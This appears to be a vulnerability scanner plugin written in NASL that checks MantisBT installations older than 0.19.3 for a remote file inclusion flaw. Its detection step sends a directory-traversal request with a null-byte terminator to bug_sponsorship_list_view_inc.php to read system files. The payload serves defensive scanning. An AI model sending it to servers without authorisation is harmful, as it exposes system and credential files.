# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:mantisbt:mantisbt";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20093");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_cve_id("CVE-2005-3091", "CVE-2005-3335", "CVE-2005-3336", "CVE-2005-3337",
                "CVE-2005-3338", "CVE-2005-3339");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("MantisBT < 0.19.3 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Web application abuses");
  script_dependencies("gb_mantisbt_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mantisbt/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/secunia_research/2005-46/advisory/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15210");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15212");
  script_xref(name:"URL", value:"http://sourceforge.net/mailarchive/forum.php?thread_id=8517463&forum_id=7369");

  script_tag(name:"summary", value:"MantisBT is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The remote version of MantisBT suffers from a remote file
  inclusion vulnerability. Provided PHP's 'register_globals' setting is enabled.

  In addition, the installed version reportedly may be prone to SQL injection (SQLi), cross-site
  scripting (XSS), and information disclosure attacks.");

  script_tag(name:"impact", value:"An attacker may be able to leverage this issue to read arbitrary
  files on the local host or to execute arbitrary PHP code, possibly taken from third-party
  hosts.");

  script_tag(name:"affected", value:"MantisBT versions prior to 0.19.3.");

  script_tag(name:"solution", value:"Update to version 0.19.3 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {
  file = files[pattern];

  url = dir + "/bug_sponsorship_list_view_inc.php?t_core_path=../../../../../../../../../../" + file + "%00";
  req = http_get(item: url, port: port);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
  if (!res)
    continue;

  if (egrep(pattern: pattern, string: res) ||
      egrep(pattern: "Warning.+main\(/" + file + ".+failed to open stream", string: res) ||
      egrep(pattern: "Failed opening .*'/" + file, string: res)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
